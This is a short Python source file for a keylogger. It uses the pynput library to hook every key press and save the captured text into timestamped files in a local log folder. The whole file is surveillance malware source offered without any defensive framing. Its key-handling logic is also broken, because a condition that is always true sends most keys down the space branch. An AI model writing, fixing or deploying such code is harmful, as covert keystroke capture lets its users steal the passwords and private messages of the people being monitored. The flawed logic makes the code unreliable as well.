import subprocess
import os
import time
from pynput.keyboard import Key, Listener

class Keylogger():

    def __init__(self, message_len = 200):
        self.message_len = message_len
        self.message = ""
        
        if not os.path.exists('log/'):
            os.mkdir('log/')

        self.log_path = 'log/'+time.asctime().replace(' ', '_')+'/'
        if not os.path.exists(self.log_path):
            os.mkdir(self.log_path)

        self.log_n = 0

    def check_message_len(self):
        return len(self.message) > self.message_len

    def compose_message(self):
        log_name = self.log_path + "log" + str(self.log_n) + ".txt"
        with open(log_name, "w") as log_file:
            log_file.write(self.message)
        
        self.log_n += 1
        self.message = ""
    
    def interpreter(self, key_char):
        # keyloggers need to have specific responses for some char

        if key_char == Key.space or Key.enter:
            if self.check_message_len():
                self.compose_message()
            else:
                self.message += ' '

        elif key_char == Key.backspace:
            self.message = self.message[:-1]

        else:
            char = '{}'.format(key_char)
            self.message += char

        if key_char == Key.esc:
            return 0


    def spy(self):
        
        with Listener(on_press=self.interpreter) as agent:
            agent.join()

if __name__ == "__main__":
    kylggr = Keylogger(message_len=10)
    kylggr.spy()